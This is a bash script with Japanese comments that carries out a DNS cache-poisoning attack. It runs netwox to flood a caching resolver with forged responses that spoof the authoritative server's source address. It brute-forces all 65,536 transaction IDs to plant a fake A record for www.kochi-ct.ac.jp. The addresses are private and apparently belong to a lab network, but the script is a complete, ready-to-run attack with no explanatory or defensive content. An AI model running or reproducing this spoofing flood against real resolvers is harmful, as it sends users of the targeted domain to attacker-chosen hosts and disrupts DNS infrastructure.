#!/bin/bash
# dns_spoof_flood.sh
# 全TXID総当たり爆撃型
# Ubuntu 22.04 + netwox 105

CACHE_DNS="192.168.56.102"   # キャッシュDNSサーバ
AUTH_DNS="192.168.56.103"    # 権威DNSサーバ（送信元を偽装）
FAKE_IP="192.168.56.104"     # 偽Aレコード
DOMAIN="www.kochi-ct.ac.jp"  # ターゲットドメイン
TTL="300"                    # 偽応答TTL

echo "[*] 攻撃開始: ${DOMAIN} → ${FAKE_IP}"
echo "[*] キャッシュDNS(${CACHE_DNS})に対して全TXID(0x0000〜0xffff)を総当たりで偽応答送信"

for txid in $(seq 0 65535); do
    HEX=$(printf "0x%04x" $txid)

    sudo netwox 105 \
        -d $CACHE_DNS \
        -D 53 \
        -s $AUTH_DNS \
        -S 53 \
        -q $HEX \
        -n $DOMAIN \
        -a $FAKE_IP \
        -A 1 \
        -T $TTL \
        >/dev/null 2>&1 &

    # 100プロセスごとに待機（システム負荷対策）
    if (( $txid % 100 == 0 )); then
        wait
        echo "[+] ${txid}/65535 TXID送信中..."
    fi
done

wait
echo "[+] 偽応答送信完了。キャッシュを確認してください。"
